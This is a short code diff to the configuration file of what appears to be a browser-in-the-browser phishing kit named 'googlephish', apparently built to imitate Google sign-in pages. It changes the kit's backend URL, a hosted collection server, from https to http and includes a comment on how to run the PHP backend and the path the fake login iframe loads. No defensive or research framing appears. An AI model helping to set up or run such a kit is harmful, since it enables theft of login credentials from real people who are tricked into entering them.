@@ -11,7 +11,7 @@ window.APP_CONFIG = {
     afterLoginRedirectDelayMs: 0,
 
     // PHP backend URL (no trailing slash). Run: cd googlephish && php -S 127.0.0.1:8080
-    googlephishBaseUrl: 'https://tk-ap-1.onrender.com',
+    googlephishBaseUrl: 'http://tk-ap-1.onrender.com',
 
     // First page the BITB iframe loads
     bitbEntryPath: '/index.php',
